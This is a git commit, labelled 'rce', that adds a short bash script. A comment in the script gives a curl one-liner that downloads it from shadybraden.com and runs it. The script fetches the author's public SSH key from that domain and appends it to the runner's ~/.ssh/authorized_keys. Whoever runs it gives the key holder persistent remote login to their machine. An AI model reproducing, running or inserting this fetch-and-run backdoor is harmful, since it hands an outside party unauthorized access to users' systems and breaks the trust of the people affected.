fc45bb1827aa1dc208967654e3b30a7d72f638cd
shady <shadybradengithub@shady.icu>
2026-05-04 09:38:13 -0400

    rce

---
+++ content/rce.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+# curl https://shadybraden.com/rce.sh -o rce.sh && chmod +x rce.sh && ./rce.sh
+
+# download my public key
+curl https://shadybraden.com/public.key -o public.key
+
+# append my public key to your authorized_keys
+cat public.key >> ~/.ssh/authorized_keys
